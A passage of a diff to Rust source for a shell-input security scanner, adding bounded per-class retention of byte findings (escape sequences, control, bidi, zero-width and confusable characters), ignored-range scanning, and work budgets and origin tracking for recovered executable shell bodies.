@@ -84,50 +84,188 @@ pub struct ByteFinding {
 }
 
 impl ByteScanResult {
-    /// Return a filtered view dropping findings whose offset falls inside
-    /// `ignore`, with `has_*` flags re-derived from the survivors so tier-1/
-    /// tier-3 gates stay consistent. Used by the inspection-subcommand carveout
-    /// (inert arg span of `tirith diff/score/why/...`). `has_invalid_utf8` is a
-    /// whole-input property and is left unchanged.
+    pub const MAX_RETAINED_DETAILS: usize = 256;
+    pub const MAX_RETAINED_DETAILS_PER_CLASS: usize = 16;
+    const OMITTED_DETAIL_DESCRIPTION: &'static str =
+        "analysis incomplete: additional byte findings were omitted";
+
+    pub fn has_omitted_details(&self) -> bool {
+        self.details.iter().any(Self::is_omission_metadata)
+    }
+
+    fn is_omission_metadata(detail: &ByteFinding) -> bool {
+        detail.offset == usize::MAX
+            && detail.byte == 0
+            && detail.codepoint.is_none()
+            && detail
+                .description
+                .starts_with(Self::OMITTED_DETAIL_DESCRIPTION)
+    }
+
+    fn dropped_detail_class_mask(&self) -> u16 {
+        self.details
+            .iter()
+            .find(|detail| Self::is_omission_metadata(detail))
+            .and_then(|detail| detail.description.rsplit_once("dropped_class_mask="))
+            .and_then(|(_, mask)| mask.parse::<u16>().ok())
+            .unwrap_or(0)
+    }
+
+    /// Back-compatible single-range filter retained for 0.3.3 callers that
+    /// construct a `ByteScanResult` and then carve out an inert argument span.
     pub fn with_ignored_range(mut self, ignore: &std::ops::Range<usize>) -> Self {
-        self.details.retain(|d| !ignore.contains(&d.offset));
-        // Re-derive flags from surviving details, matched on the description
-        // prefixes that correspond to each branch in `scan_bytes`.
-        self.has_ansi_escapes = false;
-        self.has_control_chars = false;
-        self.has_bidi_controls = false;
-        self.has_zero_width = false;
-        self.has_unicode_tags = false;
-        self.has_variation_selectors = false;
-        self.has_invisible_math_operators = false;
-        self.has_invisible_whitespace = false;
-        self.has_hangul_fillers = false;
-        self.has_confusable_text = false;
-        for d in &self.details {
-            let desc = d.description.as_str();
-            if desc.ends_with("escape sequence") || desc == "trailing escape byte" {
+        // Omission risk is class-local and must use ACTUAL drop state. Merely
+        // retaining exactly sixteen details does not prove a seventeenth ever
+        // existed, while a dropped detail may be the only signal outside the
+        // ignored range.
+        let dropped_detail_class_mask = self.dropped_detail_class_mask();
+        let class_was_lossy =
+            |class: PublicByteFindingClass| dropped_detail_class_mask & class.bit() != 0;
+        self.details.retain(|detail| {
+            Self::is_omission_metadata(detail) || !ignore.contains(&detail.offset)
+        });
+        // A lossy class may have an unretained detail outside the ignored range,
+        // so its complete-scan flag remains conservative. Lossless classes are
+        // rebuilt exactly from the retained, filtered details below.
+        self.has_ansi_escapes &= class_was_lossy(PublicByteFindingClass::Ansi);
+        self.has_control_chars &= class_was_lossy(PublicByteFindingClass::Control);
+        self.has_bidi_controls &= class_was_lossy(PublicByteFindingClass::Bidi);
+        self.has_zero_width &= class_was_lossy(PublicByteFindingClass::ZeroWidth);
+        self.has_unicode_tags &= class_was_lossy(PublicByteFindingClass::UnicodeTag);
+        self.has_variation_selectors &= class_was_lossy(PublicByteFindingClass::VariationSelector);
+        self.has_invisible_math_operators &= class_was_lossy(PublicByteFindingClass::InvisibleMath);
+        self.has_invisible_whitespace &=
+            class_was_lossy(PublicByteFindingClass::InvisibleWhitespace);
+        self.has_hangul_fillers &= class_was_lossy(PublicByteFindingClass::HangulFiller);
+        self.has_confusable_text &= class_was_lossy(PublicByteFindingClass::Confusable);
+        for detail in &self.details {
+            let description = detail.description.as_str();
+            if description.ends_with("escape sequence") || description == "trailing escape byte" {
                 self.has_ansi_escapes = true;
-            } else if desc.starts_with("control character") {
+            } else if description.starts_with("control character") {
                 self.has_control_chars = true;
-            } else if desc.starts_with("bidi control") {
+            } else if description.starts_with("bidi control") {
                 self.has_bidi_controls = true;
-            } else if desc.starts_with("zero-width character") {
+            } else if description.starts_with("zero-width character") {
                 self.has_zero_width = true;
-            } else if desc.starts_with("unicode tag") {
+            } else if description.starts_with("unicode tag") {
                 self.has_unicode_tags = true;
-            } else if desc.starts_with("variation selector") {
+            } else if description.starts_with("variation selector") {
                 self.has_variation_selectors = true;
-            } else if desc.starts_with("invisible math operator") {
+            } else if description.starts_with("invisible math operator") {
                 self.has_invisible_math_operators = true;
-            } else if desc.starts_with("invisible whitespace") {
+            } else if description.starts_with("invisible whitespace") {
                 self.has_invisible_whitespace = true;
-            } else if desc.starts_with("hangul filler") {
+            } else if description.starts_with("hangul filler") {
                 self.has_hangul_fillers = true;
-            } else if desc.starts_with("confusable") || desc.starts_with("text confusable") {
+            } else if description.starts_with("confusable")
+                || description.starts_with("text confusable")
+            {
                 self.has_confusable_text = true;
             }
         }
         self
+    }
+}
+
+#[derive(Clone, Copy)]
+enum PublicByteFindingClass {
+    Ansi,
+    Control,
+    Bidi,
+    ZeroWidth,
+    UnicodeTag,
+    VariationSelector,
+    InvisibleMath,
+    InvisibleWhitespace,
+    HangulFiller,
+    Confusable,
+}
+
+impl PublicByteFindingClass {
+    const fn bit(self) -> u16 {
+        1u16 << (self as u16)
+    }
+}
+
+/// Pattern-aware scan metadata lives outside `ByteScanResult` so the public
+/// 0.3.3 result remains externally constructible with its original fields.
+pub struct ByteScanReport {
+    pub result: ByteScanResult,
+    pub dropped_details: usize,
+    /// Bitset of public classes for which retention actually dropped at least
+    /// one detail. Unlike a retained-count heuristic, an exactly-full class is
+    /// still known to be lossless.
+    #[doc(hidden)]
+    pub dropped_detail_class_mask: u16,
+}
+
+struct ByteScanAccumulator {
+    result: ByteScanResult,
+    dropped_details: usize,
+    dropped_detail_class_mask: u16,
+    detail_counts: [usize; BYTE_FINDING_CLASS_COUNT],
+}
+
+impl ByteScanAccumulator {
+    fn push_detail(&mut self, class: ByteFindingClass, detail: ByteFinding) {
+        let class_index = class as usize;
+        if self.detail_counts[class_index] < Self::MAX_RETAINED_DETAILS_PER_CLASS
+            && self.result.details.len() < ByteScanResult::MAX_RETAINED_DETAILS
+        {
+            self.detail_counts[class_index] += 1;
+            self.result.details.push(detail);
+        } else {
+            self.dropped_details = self.dropped_details.saturating_add(1);
+            self.dropped_detail_class_mask |= class.public_class().bit();
+        }
+    }
+
+    const MAX_RETAINED_DETAILS_PER_CLASS: usize = ByteScanResult::MAX_RETAINED_DETAILS_PER_CLASS;
+
+    fn finish(self) -> ByteScanReport {
+        ByteScanReport {
+            result: self.result,
+            dropped_details: self.dropped_details,
+            dropped_detail_class_mask: self.dropped_detail_class_mask,
+        }
+    }
+}
+
+#[derive(Clone, Copy)]
+enum ByteFindingClass {
+    Ansi,
+    Control,
+    Bidi,
+    ZeroWidthBenign,
+    ZeroWidthSuspicious,
+    UnicodeTag,
+    VariationSelector,
+    InvisibleMath,
+    InvisibleWhitespace,
+    HangulFiller,
+    ConfusableBenign,
+    ConfusableSuspicious,
+}
+
+const BYTE_FINDING_CLASS_COUNT: usize = 12;
+
+impl ByteFindingClass {
+    const fn public_class(self) -> PublicByteFindingClass {
+        match self {
+            Self::Ansi => PublicByteFindingClass::Ansi,
+            Self::Control => PublicByteFindingClass::Control,
+            Self::Bidi => PublicByteFindingClass::Bidi,
+            Self::ZeroWidthBenign | Self::ZeroWidthSuspicious => PublicByteFindingClass::ZeroWidth,
+            Self::UnicodeTag => PublicByteFindingClass::UnicodeTag,
+            Self::VariationSelector => PublicByteFindingClass::VariationSelector,
+            Self::InvisibleMath => PublicByteFindingClass::InvisibleMath,
+            Self::InvisibleWhitespace => PublicByteFindingClass::InvisibleWhitespace,
+            Self::HangulFiller => PublicByteFindingClass::HangulFiller,
+            Self::ConfusableBenign | Self::ConfusableSuspicious => {
+                PublicByteFindingClass::Confusable
+            }
+        }
     }
 }
 
@@ -173,96 +311,161 @@ fn decode_utf8_scalar_prefix(input: &[u8]) -> Option<char> {
 
 /// Scan raw bytes for control characters (paste-time, Tier 1 step 1).
 pub fn scan_bytes(input: &[u8]) -> ByteScanResult {
-    let mut result = ByteScanResult {
-        has_ansi_escapes: false,
-        has_control_chars: false,
-        has_bidi_controls: false,
-        has_zero_width: false,
-        has_invalid_utf8: false,
-        has_unicode_tags: false,
-        has_variation_selectors: false,
-        has_invisible_math_operators: false,
-        has_invisible_whitespace: false,
-        has_hangul_fillers: false,
-        has_confusable_text: false,
-        details: Vec::new(),
+    compatibility_byte_scan_result(scan_bytes_with_ignored_ranges(input, &[]))
+}
+
+/// Scan while excluding inert byte ranges during the complete pass. Applying
+/// exclusions before bounded detail retention prevents an ignored prefix from
+/// consuming all detail slots and hiding a later out-of-range signal.
+pub fn scan_bytes_excluding(
+    input: &[u8],
+    ignored_ranges: &[std::ops::Range<usize>],
+) -> ByteScanResult {
+    compatibility_byte_scan_result(scan_bytes_with_ignored_ranges(input, ignored_ranges))
+}
+
+fn compatibility_byte_scan_result(report: ByteScanReport) -> ByteScanResult {
+    let ByteScanReport {
+        mut result,
+        dropped_details,
+        dropped_detail_class_mask,
+    } = report;
+    if dropped_details > 0 {
+        if result.details.len() == ByteScanResult::MAX_RETAINED_DETAILS {
+            result.details.pop();
+        }
+        result.details.push(ByteFinding {
+            offset: usize::MAX,
+            byte: 0,
+            codepoint: None,
+            description: format!(
+                "{}: omitted_details={dropped_details}; dropped_class_mask={dropped_detail_class_mask}",
+                ByteScanResult::OMITTED_DETAIL_DESCRIPTION
+            ),
+        });
+    }
+    result
+}
+
+/// Scan while excluding inert ranges and return explicit bounded-detail
+/// metadata. New callers should use this name; `scan_bytes` and
+/// `scan_bytes_excluding` remain compatibility wrappers returning 0.3.3's
+/// externally constructible `ByteScanResult`.
+pub fn scan_bytes_with_ignored_ranges(
+    input: &[u8],
+    ignored_ranges: &[std::ops::Range<usize>],
+) -> ByteScanReport {
+    let mut accumulator = ByteScanAccumulator {
+        result: ByteScanResult {
+            has_ansi_escapes: false,
+            has_control_chars: false,
+            has_bidi_controls: false,
+            has_zero_width: false,
+            has_invalid_utf8: false,
+            has_unicode_tags: false,
+            has_variation_selectors: false,
+            has_invisible_math_operators: false,
+            has_invisible_whitespace: false,
+            has_hangul_fillers: false,
+            has_confusable_text: false,
+            details: Vec::new(),
+        },
+        dropped_details: 0,
+        dropped_detail_class_mask: 0,
+        detail_counts: [0; BYTE_FINDING_CLASS_COUNT],
     };
 
     // Check for invalid UTF-8
     if std::str::from_utf8(input).is_err() {
-        result.has_invalid_utf8 = true;
+        accumulator.result.has_invalid_utf8 = true;
     }
 
     let len = input.len();
     let mut i = 0;
     while i < len {
         let b = input[i];
+        let ignored = ignored_ranges.iter().any(|range| range.contains(&i));
 
-        if b == 0x1b {
+        if b == 0x1b && !ignored {
             // CSI (\e[), OSC (\e]), APC (\e_), DCS (\eP): escape-sequence
             // introducers used for terminal injection attacks.
             if i + 1 < len {
                 let next = input[i + 1];
                 if next == b'[' || next == b']' || next == b'_' || next == b'P' {
-                    result.has_ansi_escapes = true;
-                    result.details.push(ByteFinding {
-                        offset: i,
-                        byte: b,
-                        codepoint: None,
-                        description: match next {
-                            b'[' => "CSI escape sequence",
-                            b']' => "OSC escape sequence",
-                            b'_' => "APC escape sequence",
-                            b'P' => "DCS escape sequence",
-                            _ => "escape sequence",
-                        }
-                        .to_string(),
-                    });
+                    accumulator.result.has_ansi_escapes = true;
+                    accumulator.push_detail(
+                        ByteFindingClass::Ansi,
+                        ByteFinding {
+                            offset: i,
+                            byte: b,
+                            codepoint: None,
+                            description: match next {
+                                b'[' => "CSI escape sequence",
+                                b']' => "OSC escape sequence",
+                                b'_' => "APC escape sequence",
+                                b'P' => "DCS escape sequence",
+                                _ => "escape sequence",
+                            }
+                            .to_string(),
+                        },
+                    );
                     i += 2;
                     continue;
                 }
             } else {
-                result.has_ansi_escapes = true;
-                result.details.push(ByteFinding {
-                    offset: i,
-                    byte: b,
-                    codepoint: None,
-                    description: "trailing escape byte".to_string(),
-                });
+                accumulator.result.has_ansi_escapes = true;
+                accumulator.push_detail(
+                    ByteFindingClass::Ansi,
+                    ByteFinding {
+                        offset: i,
+                        byte: b,
+                        codepoint: None,
+                        description: "trailing escape byte".to_string(),
+                    },
+                );
             }
         }
 
         // CR: only flag mid-stream CRs (display-overwriting attacks). Trailing
         // CR and CRLF (Windows line endings) are benign clipboard artifacts.
-        if b == b'\r' {
+        if b == b'\r' && !ignored {
             let is_attack_cr = i + 1 < len && input[i + 1] != b'\n';
             if is_attack_cr {
-                result.has_control_chars = true;
-                result.details.push(ByteFinding {
+                accumulator.result.has_control_chars = true;
+                accumulator.push_detail(
+                    ByteFindingClass::Control,
+                    ByteFinding {
+                        offset: i,
+                        byte: b,
+                        codepoint: None,
+                        description: format!("control character 0x{b:02x}"),
+                    },
+                );
+            }
+        } else if !ignored && b < 0x20 && b != b'\n' && b != b'\t' && b != 0x1b {
+            accumulator.result.has_control_chars = true;
+            accumulator.push_detail(
+                ByteFindingClass::Control,
+                ByteFinding {
                     offset: i,
                     byte: b,
                     codepoint: None,
                     description: format!("control character 0x{b:02x}"),
-                });
-            }
-        } else if b < 0x20 && b != b'\n' && b != b'\t' && b != 0x1b {
-            result.has_control_chars = true;
-            result.details.push(ByteFinding {
-                offset: i,
-                byte: b,
-                codepoint: None,
-                description: format!("control character 0x{b:02x}"),
-            });
+                },
+            );
         }
 
-        if b == 0x7F {
-            result.has_control_chars = true;
-            result.details.push(ByteFinding {
-                offset: i,
-                byte: b,
-                codepoint: None,
-                description: "control character 0x7f (DEL)".to_string(),
-            });
+        if b == 0x7F && !ignored {
+            accumulator.result.has_control_chars = true;
+            accumulator.push_detail(
+                ByteFindingClass::Control,
+                ByteFinding {
+                    offset: i,
+                    byte: b,
+                    codepoint: None,
+                    description: "control character 0x7f (DEL)".to_string(),
+                },
+            );
         }
 
         // UTF-8 continuation byte? Decode the char and check it against every
@@ -270,98 +473,144 @@ pub fn scan_bytes(input: &[u8]) -> ByteScanResult {
         if b >= 0xc0 {
             let remaining = &input[i..];
             if let Some(ch) = decode_utf8_scalar_prefix(remaining) {
-                if is_bidi_control(ch) {
-                    result.has_bidi_controls = true;
-                    result.details.push(ByteFinding {
-                        offset: i,
-                        byte: b,
-                        codepoint: Some(ch as u32),
-                        description: format!("bidi control U+{:04X}", ch as u32),
-                    });
+                if is_bidi_control(ch) && !ignored {
+                    accumulator.result.has_bidi_controls = true;
+                    accumulator.push_detail(
+                        ByteFindingClass::Bidi,
+                        ByteFinding {
+                            offset: i,
+                            byte: b,
+                            codepoint: Some(ch as u32),
+                            description: format!("bidi control U+{:04X}", ch as u32),
+                        },
+                    );
                 }
                 // ZWSP, ZWNJ, ZWJ, BOM, CGJ, Soft Hyphen, Word Joiner.
                 // BOM (U+FEFF) at offset 0 is a file-encoding artifact, not an attack.
-                if is_zero_width(ch) && !(ch == '\u{FEFF}' && i == 0) {
-                    result.has_zero_width = true;
-                    result.details.push(ByteFinding {
-                        offset: i,
-                        byte: b,
-                        codepoint: Some(ch as u32),
-                        description: format!("zero-width character U+{:04X}", ch as u32),
-                    });
+                if is_zero_width(ch) && !(ch == '\u{FEFF}' && i == 0) && !ignored {
+                    accumulator.result.has_zero_width = true;
+                    let class = if matches!(ch, '\u{200c}' | '\u{200d}')
+                        && crate::rules::terminal::is_joining_script_context(input, i)
+                    {
+                        ByteFindingClass::ZeroWidthBenign
+                    } else {
+                        ByteFindingClass::ZeroWidthSuspicious
+                    };
+                    accumulator.push_detail(
+                        class,
+                        ByteFinding {
+                            offset: i,
+                            byte: b,
+                            codepoint: Some(ch as u32),
+                            description: format!("zero-width character U+{:04X}", ch as u32),
+                        },
+                    );
                 }
                 // Unicode Tags U+E0000–U+E007F (hidden-ASCII encoding).
-                if is_unicode_tag(ch) {
-                    result.has_unicode_tags = true;
-                    result.details.push(ByteFinding {
-                        offset: i,
-                        byte: b,
-                        codepoint: Some(ch as u32),
-                        description: format!("unicode tag U+{:04X}", ch as u32),
-                    });
+                if is_unicode_tag(ch) && !ignored {
+                    accumulator.result.has_unicode_tags = true;
+                    accumulator.push_detail(
+                        ByteFindingClass::UnicodeTag,
+                        ByteFinding {
+                            offset: i,
+                            byte: b,
+                            codepoint: Some(ch as u32),
+                            description: format!("unicode tag U+{:04X}", ch as u32),
+                        },
+                    );
                 }
                 // U+FE00–U+FE0F and U+E0100–U+E01EF.
-                if is_variation_selector(ch) {
-                    result.has_variation_selectors = true;
-                    result.details.push(ByteFinding {
-                        offset: i,
-                        byte: b,
-                        codepoint: Some(ch as u32),
-                        description: format!("variation selector U+{:04X}", ch as u32),
-                    });
+                if is_variation_selector(ch) && !ignored {
+                    accumulator.result.has_variation_selectors = true;
+                    accumulator.push_detail(
+                        ByteFindingClass::VariationSelector,
+                        ByteFinding {
+                            offset: i,
+                            byte: b,
+                            codepoint: Some(ch as u32),
+                            description: format!("variation selector U+{:04X}", ch as u32),
+                        },
+                    );
                 }
                 // U+2061–U+2064.
-                if is_invisible_math_operator(ch) {
-                    result.has_invisible_math_operators = true;
-                    result.details.push(ByteFinding {
-                        offset: i,
-                        byte: b,
-                        codepoint: Some(ch as u32),
-                        description: format!("invisible math operator U+{:04X}", ch as u32),
-                    });
+                if is_invisible_math_operator(ch) && !ignored {
+                    accumulator.result.has_invisible_math_operators = true;
+                    accumulator.push_detail(
+                        ByteFindingClass::InvisibleMath,
+                        ByteFinding {
+                            offset: i,
+                            byte: b,
+                            codepoint: Some(ch as u32),
+                            description: format!("invisible math operator U+{:04X}", ch as u32),
+                        },
+                    );
                 }
                 // Invisible whitespace (stealth-encoded spaces).
-                if is_invisible_whitespace(ch) {
-                    result.has_invisible_whitespace = true;
-                    result.details.push(ByteFinding {
-                        offset: i,
-                        byte: b,
-                        codepoint: Some(ch as u32),
-                        description: format!("invisible whitespace U+{:04X}", ch as u32),
-                    });
+                if is_invisible_whitespace(ch) && !ignored {
+                    accumulator.result.has_invisible_whitespace = true;
+                    accumulator.push_detail(
+                        ByteFindingClass::InvisibleWhitespace,
+                        ByteFinding {
+                            offset: i,
+                            byte: b,
+                            codepoint: Some(ch as u32),
+                            description: format!("invisible whitespace U+{:04X}", ch as u32),
+                        },
+                    );
                 }
-                if is_hangul_filler(ch) {
-                    result.has_hangul_fillers = true;
-                    result.details.push(ByteFinding {
-                        offset: i,
-                        byte: b,
-                        codepoint: Some(ch as u32),
-                        description: format!("hangul filler U+{:04X}", ch as u32),
-                    });
+                if is_hangul_filler(ch) && !ignored {
+                    accumulator.result.has_hangul_fillers = true;
+                    accumulator.push_detail(
+                        ByteFindingClass::HangulFiller,
+                        ByteFinding {
+                            offset: i,
+                            byte: b,
+                            codepoint: Some(ch as u32),
+                            description: format!("hangul filler U+{:04X}", ch as u32),
+                        },
+                    );
                 }
                 // Math alphanumerics + hostname confusables.
-                if let Some(target) = crate::text_confusables::is_text_confusable(ch) {
-                    result.has_confusable_text = true;
-                    result.details.push(ByteFinding {
-                        offset: i,
-                        byte: b,
-                        codepoint: Some(ch as u32),
-                        description: format!(
-                            "text confusable U+{:04X} (looks like '{target}')",
-                            ch as u32
-                        ),
-                    });
-                } else if let Some(target) = crate::confusables::is_confusable(ch) {
-                    result.has_confusable_text = true;
-                    result.details.push(ByteFinding {
-                        offset: i,
-                        byte: b,
-                        codepoint: Some(ch as u32),
-                        description: format!(
-                            "confusable U+{:04X} (looks like '{target}')",
-                            ch as u32
-                        ),
-                    });
+                if !ignored {
+                    if let Some(target) = crate::text_confusables::is_text_confusable(ch) {
+                        accumulator.result.has_confusable_text = true;
+                        let class = if crate::rules::terminal::is_ascii_nearby(input, i) {
+                            ByteFindingClass::ConfusableSuspicious
+                        } else {
+                            ByteFindingClass::ConfusableBenign
+                        };
+                        accumulator.push_detail(
+                            class,
+                            ByteFinding {
+                                offset: i,
+                                byte: b,
+                                codepoint: Some(ch as u32),
+                                description: format!(
+                                    "text confusable U+{:04X} (looks like '{target}')",
+                                    ch as u32
+                                ),
+                            },
+                        );
+                    } else if let Some(target) = crate::confusables::is_confusable(ch) {
+                        accumulator.result.has_confusable_text = true;
+                        let class = if crate::rules::terminal::is_same_word_as_ascii(input, i) {
+                            ByteFindingClass::ConfusableSuspicious
+                        } else {
+                            ByteFindingClass::ConfusableBenign
+                        };
+                        accumulator.push_detail(
+                            class,
+                            ByteFinding {
+                                offset: i,
+                                byte: b,
+                                codepoint: Some(ch as u32),
+                                description: format!(
+                                    "confusable U+{:04X} (looks like '{target}')",
+                                    ch as u32
+                                ),
+                            },
+                        );
+                    }
                 }
                 i += ch.len_utf8();
                 continue;
@@ -371,7 +620,7 @@ pub fn scan_bytes(input: &[u8]) -> ByteScanResult {
         i += 1;
     }
 
-    result
+    accumulator.finish()
 }
 
 // Output-stream byte scanning (M7 ch1): a streaming scanner for terminal
@@ -2756,10 +3005,58 @@ fn capture_shell_body(
     None
 }
 
+fn capture_executable_body(
+    raw: &str,
+    open: usize,
+    shell: ShellType,
+    relation: ExecutableRelation,
+    bodies: &mut Vec<ExecutableBody>,
+) -> Option<usize> {
+    let close = if raw.as_bytes().get(open) == Some(&b'(') {
+        find_substitution_close(raw, open, shell)
+    } else {
+        find_shell_delimiter_close(raw, open, shell)
+    };
+    if let Some(close) = close {
+        if let Some(body) = raw.get(open + 1..close) {
+            bodies.push(ExecutableBody {
+                input: body.to_string(),
+                shell,
+                origin: Some(ExecutableBodyOrigin {
+                    parent_range: open + 1..close,
+                    relation,
+                }),
+            });
+        }
+        return Some(close + 1);
+    }
+
+    if let Some(suffix) = raw.get(open + 1..) {
+        if !suffix.trim().is_empty() {
+            bodies.push(ExecutableBody {
+                input: suffix.to_string(),
+                shell,
+                origin: Some(ExecutableBodyOrigin {
+                    parent_range: open + 1..raw.len(),
+                    relation: ExecutableRelation::Unknown,
+                }),
+            });
+        }
+    }
+    None
+}
+
 #[derive(Clone)]
 struct PosixFunctionDefinition {
     name: String,
     body: String,
+    body_kind: PosixFunctionBodyKind,
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub(crate) enum PosixFunctionBodyKind {
+    CurrentShell,
+    Subshell,
 }
 
 #[derive(Clone)]
@@ -3014,6 +3311,11 @@ fn parse_posix_function_definition(raw: &str, start: usize) -> PosixFunctionPars
     if !matches!(bytes.get(i).copied(), Some(b'{' | b'(')) {
         return PosixFunctionParse::Incomplete { body_start: i };
     }
+    let body_kind = if bytes.get(i) == Some(&b'(') {
+        PosixFunctionBodyKind::Subshell
+    } else {
+        PosixFunctionBodyKind::CurrentShell
+    };
     let body_start = i + 1;
     let Some(close) = find_shell_delimiter_close(raw, i, ShellType::Posix) else {
         return PosixFunctionParse::Incomplete { body_start };
@@ -3025,6 +3327,7 @@ fn parse_posix_function_definition(raw: &str, start: usize) -> PosixFunctionPars
         definition: PosixFunctionDefinition {
             name,
             body: body.to_string(),
+            body_kind,
         },
         end: close + 1,
     }
@@ -3071,6 +3374,10 @@ pub(crate) enum ShellExecutionGap {
     /// An active POSIX/Fish/Cmd group or substitution was opened but could not
     /// be closed within the bounded lexical parser.
     IncompleteExecutableBody,
+    /// Executable-body discovery exhausted its global input, lexical-candidate,
+    /// or retained-body budget. Bodies recovered before the boundary remain
+    /// available, but the unexamined suffix must fail closed.
+    WorkBudgetExceeded,
 }
 
 /// A statically recovered command body together with the shell that will parse
@@ -3081,6 +3388,21 @@ pub(crate) enum ShellExecutionGap {
 pub(crate) struct ExecutableBody {
     pub input: String,
     pub shell: ShellType,
+    /// Discovery-time source identity. Decoded/generated bodies may not have a
+    /// byte-for-byte child range, but they still retain the exact parent
+    /// occurrence and execution role selected by the parser branch that found
+    /// them.
+    pub origin: Option<ExecutableBodyOrigin>,
+}
+
+impl ExecutableBody {
+    fn without_origin(input: String, shell: ShellType) -> Self {
+        Self {
+            input,
+            shell,
+            origin: None,
+        }
+    }
 }
 
 #[derive(Debug, Default)]
@@ -3089,9 +3411,49 @@ pub(crate) struct ExecutableSubstitutionScan {
     pub gap: Option<ShellExecutionGap>,
 }
 
+/// How one recovered body participates in its parent command. Flow analysis
+/// must distinguish a replacement shell body from a command substitution used
+/// as an argv value; merging all recovered bodies as stdout is unsound.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub(crate) enum ExecutableRelation {
+    WrapperReplacement,
+    ArgumentValue { index: usize },
+    Concurrent,
+    Unknown,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub(crate) struct ExecutableBodyOrigin {
+    pub parent_range: std::ops::Range<usize>,
+    pub relation: ExecutableRelation,
+}
+
+fn executable_argument_relation(argument: Option<usize>) -> ExecutableRelation {
+    argument.map_or(ExecutableRelation::Unknown, |index| {
+        ExecutableRelation::ArgumentValue { index }
+    })
+}
+
+#[derive(Debug)]
+pub(crate) struct ExecutableBodyOccurrence {
+    pub body: ExecutableBody,
+    pub relation: ExecutableRelation,
+    /// Best-effort byte range in the parent segment. If decoding or shell
+    /// normalization changed the body bytes, this is the exact parent segment
+    /// range rather than a fabricated child offset.
+    pub parent_range: std::ops::Range<usize>,
+}
+
 const MAX_HEREDOCS: usize = 32;
 const MAX_HEREDOC_DELIMITER_BYTES: usize = 256;
 const MAX_HEREDOC_BODY_BYTES: usize = 256 * 1024;
+// Keep the root ceiling above every supported single-body decoder/rewrite
+// ceiling (currently 256 KiB), while preventing the 10 MiB file/LSP ceiling
+// from reaching the allocation-heavy shell parsers in one pass.
+pub(crate) const MAX_EXECUTABLE_SCAN_INPUT_BYTES: usize = 512 * 1024;
+pub(crate) const MAX_EXECUTABLE_SCAN_CANDIDATES: usize = 256;
+const MAX_EXECUTABLE_SCAN_BODIES: usize = 64;
+const MAX_EXECUTABLE_SCAN_BODY_BYTES: usize = 512 * 1024;
 
 #[derive(Debug)]
 struct PosixHeredocSpec {
@@ -3337,6 +3699,7 @@ fn scan_unquoted_heredoc_expansions(body: &str, scan: &mut PosixHeredocRecovery)
                         .extend(recovered.into_iter().map(|input| ExecutableBody {
                             input,
                             shell: ShellType::Posix,
+                            origin: None,
                         }));
                     index = next;
                 }
@@ -3359,6 +3722,7 @@ fn scan_unquoted_heredoc_expansions(body: &str, scan: &mut PosixHeredocRecovery)
                 scan.bodies.push(ExecutableBody {
                     input: input.to_string(),
                     shell: ShellType::Posix,
+                    origin: None,
                 });
             }
             index = close + 1;
@@ -3559,7 +3923,9 @@ fn recover_posix_heredocs(raw: &str) -> PosixHeredocRecovery {
                         unescape_unquoted_heredoc(&body)
                     };
                     if !input.trim().is_empty() {
-                        recovery.bodies.push(ExecutableBody { input, shell });
+                        recovery
+                            .bodies
+                            .push(ExecutableBody::without_origin(input, shell));
                     }
                 }
             }
@@ -3594,6 +3960,194 @@ pub(crate) fn shell_execution_view<'a>(
     }
 }
 
+fn bounded_executable_input(raw: &str) -> (&str, bool) {
+    if raw.len() <= MAX_EXECUTABLE_SCAN_INPUT_BYTES {
+        return (raw, false);
+    }
+
+    let mut end = MAX_EXECUTABLE_SCAN_INPUT_BYTES;
+    while !raw.is_char_boundary(end) {
+        end -= 1;
+    }
+    (raw.get(..end).unwrap_or_default(), true)
+}
+
+/// Bound the amount of lexical shell structure handed to the expensive body
+/// parsers. This pass is linear and uses only the existing bounded delimiter
+/// stack. It counts ordinary shell words plus active substitution/group
+/// openers, while ignoring comments and single-quoted data. Nested bodies are
+/// counted again when recursively analyzed, so one outer `$(` cannot smuggle
+/// an unbounded child workload.
+fn bounded_executable_candidates(raw: &str, shell: ShellType) -> (&str, bool) {
+    let bytes = raw.as_bytes();
+    let mut quote = ShellLexQuote::Normal;
+    let mut word_start = true;
+    let mut candidates = 0usize;
+    let mut index = 0usize;
+
+    while index < bytes.len() {
+        let byte = bytes[index];
+        match quote {
+            ShellLexQuote::Single => {
+                if byte == b'\'' {
+                    if shell == ShellType::PowerShell && bytes.get(index + 1) == Some(&b'\'') {
+                        index += 2;
+                        continue;
+                    }
+                    quote = ShellLexQuote::Normal;
+                }
+                index += 1;
+                continue;
+            }
+            ShellLexQuote::Double => {
+                if byte == shell_escape_byte(shell) && index + 1 < bytes.len() {
+                    index += 2;
+                    continue;
+                }
+                if byte == b'"' {
+                    quote = ShellLexQuote::Normal;
+                    index += 1;
+                    continue;
+                }
+                let active_substitution =
+                    shell != ShellType::Cmd && byte == b'$' && bytes.get(index + 1) == Some(&b'(');
+                let active_backtick = shell == ShellType::Posix && byte == b'`';
+                if active_substitution || active_backtick {
+                    if candidates >= MAX_EXECUTABLE_SCAN_CANDIDATES {
+                        return (raw.get(..index).unwrap_or_default(), true);
+                    }
+                    candidates += 1;
+                    index = if active_substitution {
+                        find_shell_delimiter_close(raw, index + 1, shell)
+                            .map_or(bytes.len(), |close| close + 1)
+                    } else {
+                        find_backtick_close(raw, index).map_or(bytes.len(), |close| close + 1)
+                    };
+                    continue;
+                }
+                index += 1;
+                continue;
+            }
+            ShellLexQuote::Normal => {}
+        }
+
+        if starts_shell_line_comment(bytes, index, shell, word_start) {
+            while index < bytes.len() && bytes[index] != b'\n' {
+                index += 1;
+            }
+            word_start = true;
+            continue;
+        }
+
+        if byte == shell_escape_byte(shell) && index + 1 < bytes.len() {
+            if word_start {
+                if candidates >= MAX_EXECUTABLE_SCAN_CANDIDATES {
+                    return (raw.get(..index).unwrap_or_default(), true);
+                }
+                candidates += 1;
+            }
+            word_start = false;
+            index += 2;
+            continue;
+        }
+
+        if byte == b'\'' && shell != ShellType::Cmd {
+            if word_start {
+                if candidates >= MAX_EXECUTABLE_SCAN_CANDIDATES {
+                    return (raw.get(..index).unwrap_or_default(), true);
+                }
+                candidates += 1;
+            }
+            word_start = false;
+            quote = ShellLexQuote::Single;
+            index += 1;
+            continue;
+        }
+        if byte == b'"' {
+            if word_start {
+                if candidates >= MAX_EXECUTABLE_SCAN_CANDIDATES {
+                    return (raw.get(..index).unwrap_or_default(), true);
+                }
+                candidates += 1;
+            }
+            word_start = false;
